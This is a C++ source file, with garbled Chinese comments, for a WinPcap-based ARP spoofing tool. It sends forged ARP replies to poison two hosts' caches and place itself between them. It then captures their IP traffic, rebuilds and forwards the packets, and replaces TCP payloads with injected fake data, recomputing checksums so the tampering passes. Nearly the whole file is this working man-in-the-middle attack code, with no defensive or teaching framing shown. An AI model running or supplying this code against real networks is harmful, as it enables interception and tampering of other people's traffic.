//ArpCheat.cpp 
#include <stdio.h> 
#include <pcap.h> 
#include <conio.h> 
#include "packet32.h" 
#include <ntddndis.h> 
#include "ArpCheat.h" 

#define SIMULATE_IP "192.168.1.3"
#define TARGET_IP "192.168.1.1"

#define SIMULATE_MAC "000cf1f3cb08"     //αװ������MAC��ַ ip=192.168.1.3
#define TARGET_MAC "00219711d0be"       //Ŀ��������MAC��ַ ip=192.168.1.1
#define LOCAL_MAC "002186604136"        //����MAC��ַ  ip=192.168.1.2
#define source_ip "192.168.1.2"
unsigned char *mac; //����MAC��ַ

struct CHEAT_ARP_INFO        //ARP��ƭ�̵߳Ĳ��� 
{ 
    unsigned long simulateIP; 
    unsigned long targetIP; 
    char targetMAC[13]; 
}; 
CHEAT_ARP_INFO info1={0},info2={0}; 

pcap_t *adhandle; //һ��pcapʵ�� 

DWORD WINAPI ArpCheat(void *pInfo); 

void StrToMac(char *str,unsigned char *mac)  //�Զ���Ľ��ַ���ת����mac��ַ�ĺ��� 
{ 
    char *str1; 
    int i; 
    int low,high; 
    char temp; 

    for(i=0;i<6;i++) 
    { 
        str1=str+1; 
        switch(*str) 
        { 
        case 'a':high=10; 
                 break; 
        case 'b':high=11; 
                 break; 
        case 'c':high=12; 
                 break; 
        case 'd':high=13; 
                 break; 
        case 'e':high=14; 
                 break; 
        case 'f':high=15; 
                 break; 
        default:temp=*str; 
                high=atoi(&temp); 
        } 
        switch(*str1) 
        { 
        case 'a':low=10; 
                 break; 
        case 'b':low=11; 
                 break; 
        case 'c':low=12; 
                 break; 
        case 'd':low=13; 
                 break; 
        case 'e':low=14; 
                 break; 
        case 'f':low=15; 
                 break; 
        default:temp=*str1; 
                low=atoi(&temp); 
        }  
		*mac=high*16+low;
        str+=2; 
		mac++;
    } 
} 

USHORT CheckSum(USHORT *buffer, int size) 
{ 
    unsigned long cksum=0; 
    while(size >1) 
    { 
        cksum+=*buffer++; 
        size -=sizeof(USHORT); 
    } 
    if(size) 
        cksum += *(UCHAR*)buffer; 

    cksum = (cksum >> 16) + (cksum & 0xffff); 
    cksum += (cksum >>16); 
    return (USHORT)(~cksum); 
}

struct bpf_hdr {
	struct timeval	bh_tstamp;	///< The timestamp associated with the captured packet. 
								///< It is stored in a TimeVal structure.
	UINT	bh_caplen;			///< Length of captured portion. The captured portion <b>can be different</b>
								///< from the original packet, because it is possible (with a proper filter)
								///< to instruct the driver to capture only a portion of the packets.
	UINT	bh_datalen;			///< Original length of packet
	USHORT		bh_hdrlen;		///< Length of bpf header (this struct plus alignment padding). In some cases,
								///< a padding could be added between the end of this structure and the packet
								///< data for performance reasons. This filed can be used to retrieve the actual data 
								///< of the packet.
};


void AssayAndSendData(LPADAPTER lpAdapter,LPPACKET lpPacket) 
{ 
    unsigned char *buf=NULL; 
//	unsigned char *packet; //���ݰ� 
    bpf_hdr *lpBpfhdr=NULL; 
    ethernet_head *lpEthdr;
	in_addr addr={0}; 

	LPPACKET lpSendPacket; 

    buf=(unsigned char *)lpPacket->Buffer; 
    lpBpfhdr=(bpf_hdr *)buf; //ÿ�����յ������ݰ�������bpf_hdr��header,Ȼ�������̫��������
    lpEthdr=(ethernet_head *)(buf+lpBpfhdr->bh_hdrlen);//��̫��header 
	if(lpEthdr->eh_type==htons(0x0800))     //�ж��Ƿ�ΪIP��,����ת�� 
    { 
		char sendSynBuf[128]={0};
		unsigned char s_mac[6]={0},d_mac[6]={0}; 
        ethernet_head et_header={0}; 
        IP_HEADER ip_header={0}; 
        TCP_HEADER tcp_header={0}; 
        PSD_HEADER psd_header={0}; 
		char *fake_data="ffantasyYD";


		IP_HEADER *lpIphdr=(IP_HEADER *)(buf+lpBpfhdr->bh_hdrlen+sizeof(ethernet_head));//ip_header
		TCP_HEADER *lpTcphdr=(TCP_HEADER *)(buf+lpBpfhdr->bh_hdrlen+sizeof(ethernet_head)+sizeof(IP_HEADER));//tcp_header 
        char *data=(char *)(buf+lpBpfhdr->bh_hdrlen+sizeof(ethernet_head)+sizeof(IP_HEADER)+sizeof(TCP_HEADER)); //data

		//////////////////////////////////////////////////////////
		//eth hear��װ
		if ( inet_addr(SIMULATE_IP)==lpIphdr->m_dIP )//Ŀ��ip
		{
			//Ŀ��MAC��ַ
			StrToMac(SIMULATE_MAC,d_mac); 
			printf("Ŀ��mac��(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X) \n",
				d_mac[0],d_mac[1],d_mac[2],d_mac[3],d_mac[4],d_mac[5]);
			memcpy(et_header.dest_mac,d_mac,sizeof(d_mac)); 
		}
		if (inet_addr(TARGET_IP)==lpIphdr->m_dIP)//
		{
			//Ŀ��MAC��ַ
			StrToMac(TARGET_MAC,d_mac); 
			printf("Ŀ��mac��(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X) \n",
				d_mac[0],d_mac[1],d_mac[2],d_mac[3],d_mac[4],d_mac[5]);
			memcpy(et_header.dest_mac,d_mac,sizeof(d_mac)); 
		}

		//Դmac��ַ����Ϊ��ƭ�����ģ����Լ�������
		printf("Դmac��(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X) \n",
			mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
		memcpy(et_header.source_mac,mac,sizeof(mac)); 

		et_header.eh_type=htons(0x0800);  //����Ϊ0x0800��ʾ����IP�� 

		///////////////////////////////////////////////////////////////////////////

		///////////////////////////////////////////////////////////////////////////
		//ip header��װ
        ip_header.m_ver_hlen=lpIphdr->m_ver_hlen; 
        ip_header.m_tos=lpIphdr->m_tos; 
        ip_header.m_tlen=lpIphdr->m_tlen; 
        ip_header.m_ident=lpIphdr->m_ident; 
        ip_header.m_flag_frag=lpIphdr->m_flag_frag; //����Ϊ����Ƭ 
        ip_header.m_ttl=lpIphdr->m_ttl; 
        ip_header.m_protocol=lpIphdr->m_protocol;   //�߲�Э��ΪTCP 
        ip_header.m_cksum=lpIphdr->m_cksum; 
        ip_header.m_sIP=lpIphdr->m_sIP; 
        ip_header.m_dIP=lpIphdr->m_dIP; 

		//////////////////////////////////////////////////////////////////////////


		//////////////////////////////////////////////////////////////////////////
		//tcp header��װ
		tcp_header.m_dport=lpTcphdr->m_dport; 
        tcp_header.m_sport=lpTcphdr->m_sport; 
        tcp_header.m_seq=lpTcphdr->m_seq;        //���к�Ϊ���յ�����ack��    
        tcp_header.m_ack=lpTcphdr->m_ack; //����ΪACK�� 
        tcp_header.m_hlen_res4=lpTcphdr->m_hlen_res4; 
        tcp_header.m_res2_flag=lpTcphdr->m_res2_flag;       
        tcp_header.m_win=lpTcphdr->m_win; 
        tcp_header.m_cksum=lpTcphdr->m_cksum; 
        tcp_header.m_urp=lpTcphdr->m_urp; 
		/////////////////////////////////////////////////////////////////////////

		
/*
		//���ݰ��γɵĹ���
		memcpy(sendSynBuf,&et_header,sizeof(ethernet_head)); 
        memcpy(sendSynBuf+sizeof(ethernet_head),&ip_header,sizeof(IP_HEADER)); 
        memcpy(sendSynBuf+sizeof(ethernet_head)+sizeof(IP_HEADER),&tcp_header,sizeof(TCP_HEADER)); 
		memcpy(sendSynBuf+sizeof(ethernet_head)+sizeof(IP_HEADER)+sizeof(TCP_HEADER),data,strlen(data));
*/

		
		if((lpTcphdr->m_res2_flag & 0x08)==0)//˵���������ݰ�
		{//��������
			//�ж��ǲ���tcp����������dataΪ��
			//���Ϊ�գ���ô�Ϳ�����������
			printf("data : %s\n",data);

			psd_header.m_daddr=ip_header.m_dIP; 
            psd_header.m_saddr=ip_header.m_sIP; 
            psd_header.m_mbz=0; 
            psd_header.m_ptcl=IPPROTO_TCP; 
            psd_header.m_tcpl=htons(sizeof(TCP_HEADER)+strlen(data)); 

            char tcpBuf[128]={0}; 
            memcpy(tcpBuf,&psd_header,sizeof(PSD_HEADER)); 
            memcpy(tcpBuf+sizeof(PSD_HEADER),&tcp_header,sizeof(TCP_HEADER)); 
            memcpy(tcpBuf+sizeof(PSD_HEADER)+sizeof(TCP_HEADER),data,strlen(data)); 
            tcp_header.m_cksum=CheckSum((USHORT *)tcpBuf,sizeof(PSD_HEADER)+sizeof(TCP_HEADER)+strlen(data));

            printf("changed tcp chsum : %d!\n",tcp_header.m_cksum);
		    tcp_header.m_cksum=lpTcphdr->m_cksum;
		    printf("org tcp chsum : %d!\n",tcp_header.m_cksum);
			
					//���ݰ��γɵĹ���
			memcpy(sendSynBuf,&et_header,sizeof(ethernet_head)); 
			memcpy(sendSynBuf+sizeof(ethernet_head),&ip_header,sizeof(IP_HEADER)); 
			memcpy(sendSynBuf+sizeof(ethernet_head)+sizeof(IP_HEADER),&tcp_header,sizeof(TCP_HEADER)); 
            memcpy(sendSynBuf+sizeof(ethernet_head)+sizeof(IP_HEADER)+sizeof(TCP_HEADER),data,strlen(data));
		}
		else
		{//α������
			printf("data is not empty, I can change data!\n");
			
            psd_header.m_daddr=ip_header.m_dIP; 
            psd_header.m_saddr=ip_header.m_sIP; 
            psd_header.m_mbz=0; 
            psd_header.m_ptcl=IPPROTO_TCP; 
            psd_header.m_tcpl=htons(sizeof(TCP_HEADER)+strlen(fake_data)); 

            char tcpBuf[128]={0}; 
            memcpy(tcpBuf,&psd_header,sizeof(PSD_HEADER)); 
            memcpy(tcpBuf+sizeof(PSD_HEADER),&tcp_header,sizeof(TCP_HEADER)); 
            memcpy(tcpBuf+sizeof(PSD_HEADER)+sizeof(TCP_HEADER),fake_data,strlen(fake_data)); 
            tcp_header.m_cksum=CheckSum((USHORT *)tcpBuf,sizeof(PSD_HEADER)+sizeof(TCP_HEADER)+strlen(fake_data)); ; 

			printf("org tcp chsum : %d!\n",lpTcphdr->m_cksum);
			printf("changed tcp chsum : %d!\n",tcp_header.m_cksum);


			memcpy(sendSynBuf,&et_header,sizeof(ethernet_head)); 
			memcpy(sendSynBuf+sizeof(ethernet_head),&ip_header,sizeof(IP_HEADER)); 
			memcpy(sendSynBuf+sizeof(ethernet_head)+sizeof(IP_HEADER),&tcp_header,sizeof(TCP_HEADER)); 
			memcpy(sendSynBuf+sizeof(ethernet_head)+sizeof(IP_HEADER)+sizeof(TCP_HEADER),fake_data,strlen(fake_data));
		}
        

		lpSendPacket=PacketAllocatePacket();     //��sendPACKET�ṹָ������ڴ� 
        PacketInitPacket(lpSendPacket,sendSynBuf,sizeof(sendSynBuf));   //��ʼ��sendPACKET�ṹָ��

		if(PacketSetNumWrites(lpAdapter,1)==FALSE)   //���÷��ʹ��� 
        { 
            printf("Warning: set num error!\n"); 
            return; 
        } 

        if(PacketSendPacket(lpAdapter,lpSendPacket,TRUE)==FALSE)  
        { 
            printf("Error sending the packets!\n"); 
            return; 
        } 
/*
		packet=(unsigned char*)lpBpfhdr;
		if(pcap_sendpacket(adhandle, buf, 60)==-1)//���͵������ݰ�
		{ 
		  fprintf(stderr,"pcap_sendpacket error.\n"); 
		}
		else
			printf("transfer data now\n");
*/

	}
    
    return; 
} 

void Listen(char* pDevName) 
{ 
    LPPACKET lpRevPacket; 
    char recvBuf[512]={0}; 
	int j=0;
//	char *buf;


	LPADAPTER lpAdapter = PacketOpenAdapter(pDevName); 

    PacketSetHwFilter(lpAdapter, NDIS_PACKET_TYPE_DIRECTED);   //��������Ϊֱ��ģʽ 
    PacketSetBuff(lpAdapter,1024);     //���������������ݰ��Ļ�������С 
    PacketSetReadTimeout(lpAdapter,0);   //���ý��յ�һ������ġ���Ϣ��ʱ�� 
	//�˺����������÷�����

    while(TRUE) 
    { 
        lpRevPacket=PacketAllocatePacket();    //��PACKET�ṹָ������ڴ� 
        PacketInitPacket(lpRevPacket,recvBuf,512);    //��ʼ��PACKET�ṹָ�� 

	

        if(PacketReceivePacket(lpAdapter,lpRevPacket,TRUE)==TRUE)   //��������֡ 
		{
			j++;
			printf("Recv data %d\n",j);
		
			AssayAndSendData(lpAdapter,lpRevPacket);//ת�����ݰ�
//			buf = (char*)lpPacket->Buffer;
//            printf("Recv data %d: %s\n",j,(char*)lpPacket->Buffer);         //�������ݰ�������ACK��
		}
        else 
            printf("Recv Error!\n"); 

        //ÿ���հ�������lpPacket�� 
        PacketFreePacket(lpRevPacket); 
        memset(recvBuf,0,512); 
        Sleep(10); 
    } 

    PacketFreePacket(lpRevPacket);   //�ͷ�lpPacket 
    return; 
} 



int main(int argc,char* argv[])
{ 
	pcap_if_t *alldevs; //ȫ�������б� 
	pcap_if_t *d; //һ������ 
	int inum; //�û�ѡ���������� 
	int i=0; //ѭ������ 
	int j=0;

	char DevName[128];

	char errbuf[PCAP_ERRBUF_SIZE]; //���󻺳��� 

//	unsigned char *packet; //ARP�� 
	unsigned long fakeIp; //Ҫαװ�ɵ�IP��ַ 
    //ADD by zjw
	unsigned long targetIp; //Ŀ��IP��ַ 
	unsigned long sourceIp;

	pcap_addr_t *pAddr; //������ַ 
	unsigned long ip; //IP��ַ 
	unsigned long netmask; //�������� 

	if(argc!=3){ 
		printf("Usage: %s fake_ip target_ip\n",argv[0]); 
		return -1; 
	} 

	//�Ӳ����б���Ҫαװ��IP��ַ 
	fakeIp = inet_addr(argv[1]); 
	if(INADDR_NONE==fakeIp)
	{ 
		fprintf(stderr,"Invalid IP: %s\n",argv[1]); 
		return -1; 
	} 
	//Add by zjw
	//�Ӳ����еõ�Ŀ��ip��ַ
	targetIp = inet_addr(argv[2]);
	if(INADDR_NONE==targetIp)
	{ 
		fprintf(stderr,"Invalid IP: %s\n",argv[2]); 
		return -1; 
	} 
	sourceIp = inet_addr(source_ip);
	if(INADDR_NONE==sourceIp)
	{ 
		fprintf(stderr,"Invalid IP: %s\n",source_ip); 
		return -1; 
	} 


	/* ��ñ��������б� */ 
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) 
	{ 
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf); 
		exit(1); 
	} 

	/* ��ӡ�����б� */ 
	for(d=alldevs; d; d=d->next) 
	{ 
		printf("%d", ++i); 
		if (d->description) 
		   printf(". %s\n", d->description); 
		else 
		   printf(". No description available\n"); 
	} 
	//���û�з������� 
	if(i==0) 
	{ 
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n"); 
		return -1; 
	} 
	//���û�ѡ��һ������ 
	printf("Enter the interface number (1-%d):",i); 
	scanf("%d", &inum); 

	//����û�ѡ���������ų�����Ч��Χ�����˳� 
	if(inum < 1 || inum > i) 
	{ 
		printf("\nInterface number out of range.\n"); 
		/* Free the device list */ 
		pcap_freealldevs(alldevs); 
		return -1; 
	} 


	/* �ƶ�ָ�뵽�û�ѡ������� */ 
	for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++); 

	mac = GetSelfMac(d->name+8); //+8��ȥ��"rpcap://" 

	sprintf(DevName,"%s",d->name+8);
	printf("�������ƣ�%s\n",DevName);

	printf("����mac(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X) \n", 
	mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]); 


	/* ������ */ 
	if ( (adhandle= pcap_open(d->name, // name of the device 
	65536, // portion of the packet to capture 
	0, //open flag 
	1000, // read timeout 
	NULL, // authentication on the remote machine 
	errbuf // error buffer 
	) ) == NULL) 
	{ 
		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", 
		d->name); 
		/* Free the device list */ 
		pcap_freealldevs(alldevs); 
		return -1; 
	} 

	for(pAddr=d->addresses; pAddr; pAddr=pAddr->next)
	{ 
		j++;
		printf("j=%d\n",j);

		//�õ��û�ѡ���������һ��IP��ַ 
		ip = ((struct sockaddr_in *)pAddr->addr)->sin_addr.s_addr; 
		//�õ���IP��ַ��Ӧ���������� 
		netmask = ((struct sockaddr_in *)(pAddr->netmask))->sin_addr.S_un.S_addr; 
		if (!ip || !netmask)
		{ 
		    continue; 
		} 
		//�������IP��Ҫαװ��IP�Ƿ���ͬһ������ 
		if((ip&netmask)!=(fakeIp&netmask))
		{ 
		    continue; //�������һ������������������ַ�б� 
		} 

		unsigned long netsize = ntohl(~netmask); //������������ 

		unsigned long net = ip & netmask; //������ַ 

        //Add by zjw
		info1.simulateIP=fakeIp;
		info1.targetIP=targetIp; 
		memcpy(info1.targetMAC,TARGET_MAC,strlen(TARGET_MAC)); 
		printf("info1.targetMAC: %s\n",info1.targetMAC);
		ArpCheat(&info1);
//		::CreateThread(NULL,0,ArpCheat,&info1,0,NULL); 

		info2.simulateIP=targetIp;
		info2.targetIP=fakeIp; 
		memcpy(info2.targetMAC,SIMULATE_MAC,strlen(SIMULATE_MAC)); 
		printf("info2.targetMAC: %s\n",info2.targetMAC);
		ArpCheat(&info2);
//		::CreateThread(NULL,0,ArpCheat,&info2,0,NULL); 

		Listen(DevName);



/*
		//���͹㲥��
		for(unsigned long n=1; n<netsize; n++)
		{ 
    		//��į������IP��ַ�������ֽ�˳�� 
			unsigned long destIp = net | htonl(n); 
			//�����ٵ�ARP��������ﵽ����αװ�ɸ�����IP��ַ��Ŀ�� 
			packet = BuildArpPacket(mac,fakeIp,destIp); 
			if(pcap_sendpacket(adhandle, packet, 60)==-1)
			{ 
			  fprintf(stderr,"pcap_sendpacket error.\n"); 
			} 
		} 

 */
	} 
//	while(1);

    return 0; 
} 
/** 
* ���������MAC��ַ 
* pDevName �������豸���� 
*/ 
unsigned char* GetSelfMac(char* pDevName)
{ 

	static u_char mac[6]; 

	memset(mac,0,sizeof(mac)); 

	LPADAPTER lpAdapter = PacketOpenAdapter(pDevName); 

	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE)) 
	{ 
	    return NULL; 
	} 

	PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA)); 
	if (OidData == NULL) 
	{ 
		PacketCloseAdapter(lpAdapter); 
		return NULL; 
	} 
	// 
	// Retrieve the adapter MAC querying the NIC driver 
	// 
	OidData->Oid = OID_802_3_CURRENT_ADDRESS; 

	OidData->Length = 6; 
	memset(OidData->Data, 0, 6); 
	BOOLEAN Status = PacketRequest(lpAdapter, FALSE, OidData); 
	if(Status) 
	{ 
	   memcpy(mac,(u_char*)(OidData->Data),6); 
	} 
	free(OidData); 
	PacketCloseAdapter(lpAdapter); 
	return mac; 

} 

/** 
* ��װARP����� 
* source_mac ԴMAC��ַ 
* srcIP ԴIP 
* destIP Ŀ��IP 
*/ 
unsigned char* BuildArpPacket(unsigned char* source_mac, 
unsigned long srcIP,unsigned long destIP) 
{ 
	static struct arp_packet packet; 

	//Ŀ��MAC��ַΪ�㲥��ַ��FF-FF-FF-FF-FF-FF 
	memset(packet.eth.dest_mac,0xFF,6); 
	//ԴMAC��ַ 
	memcpy(packet.eth.source_mac,source_mac,6); 
	//�ϲ�Э��ΪARPЭ�飬0x0806 
	packet.eth.eh_type = htons(0x0806); 

	//Ӳ�����ͣ�Ethernet��0x0001 
	packet.arp.hardware_type = htons(0x0001); 
	//�ϲ�Э�����ͣ�IPΪ0x0800 
	packet.arp.protocol_type = htons(0x0800); 
	//Ӳ����ַ���ȣ�MAC��ַ����Ϊ0x06 
	packet.arp.add_len = 0x06; 
	//Э���ַ���ȣ�IP��ַ����Ϊ0x04 
	packet.arp.pro_len = 0x04; 
	//������ARP����Ϊ1 
	packet.arp.option = htons(0x0001); 
	//ԴMAC��ַ 
	memcpy(packet.arp.sour_addr,source_mac,6); 
	//ԴIP��ַ 
	packet.arp.sour_ip = srcIP; 
	//Ŀ��MAC��ַ�����0 
	memset(packet.arp.dest_addr,0,6); 
	//Ŀ��IP��ַ 
	packet.arp.dest_ip = destIP; 
	//������ݣ�18B 
	memset(packet.arp.padding,0,18); 

	return (unsigned char*)&packet; 
} 

DWORD WINAPI ArpCheat(void *pInfo) 
{ 

	static struct arp_packet packet; 
	unsigned char *ARP_packet; //ARP�� 
    unsigned char s_mac[6]={0},d_mac[6]={0}; 

    CHEAT_ARP_INFO info={0}; 
    memcpy(&info,pInfo,sizeof(CHEAT_ARP_INFO)); 

	//Ŀ��MAC��ַ
	StrToMac(info.targetMAC,d_mac); 
	printf("Ŀ��mac(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X) \n",
		d_mac[0],d_mac[1],d_mac[2],d_mac[3],d_mac[4],d_mac[5]);
//	memset(packet.eth.dest_mac,0xFF,6); 
	memcpy(packet.eth.dest_mac,d_mac,sizeof(d_mac)); 
	printf("eth.dest_mac: %s\n",d_mac);

	//ԴMAC��ַ 
//	StrToMac(LOCAL_MAC,s_mac);
	memcpy(packet.eth.source_mac,mac,sizeof(LOCAL_MAC)); 
	printf("eth.source_mac: %s\n",packet.eth.source_mac);

	//�ϲ�Э��ΪARPЭ�飬0x0806 
	packet.eth.eh_type = htons(0x0806); 

	//Ӳ�����ͣ�Ethernet��0x0001 
	packet.arp.hardware_type = htons(0x0001); 
	//�ϲ�Э�����ͣ�IPΪ0x0800 
	packet.arp.protocol_type = htons(0x0800); 
	//Ӳ����ַ���ȣ�MAC��ַ����Ϊ0x06 
	packet.arp.add_len = 0x06; 
	//Э���ַ���ȣ�IP��ַ����Ϊ0x04 
	packet.arp.pro_len = 0x04; 
	//������ARP replayΪ2 requestΪ1
	packet.arp.option = htons(0x0002); 
	//ԴMAC��ַ 
	memcpy(packet.arp.sour_addr,mac,sizeof(LOCAL_MAC));
	printf("arp.sour_addr: %s\n",packet.arp.sour_addr);
	//ԴIP��ַ 
	packet.arp.sour_ip = info.simulateIP; 
	//Ŀ��MAC��ַ
//	memset(packet.arp.dest_addr,0,6); 
	memcpy(packet.arp.dest_addr,d_mac,sizeof(d_mac));
	printf("arp.dest_addr: %s\n",packet.arp.dest_addr);
	//Ŀ��IP��ַ 
	packet.arp.dest_ip = info.targetIP; 
	//������ݣ�18B 
	memset(packet.arp.padding,0,18); 

	ARP_packet=(unsigned char*)&packet;
//	while(1)
	{
		if(pcap_sendpacket(adhandle, ARP_packet, 60)==-1)
		{ 
		  fprintf(stderr,"pcap_sendpacket error.\n"); 
		}
//		Sleep(3000);
		Sleep(1000);
	}
    return 0;
} 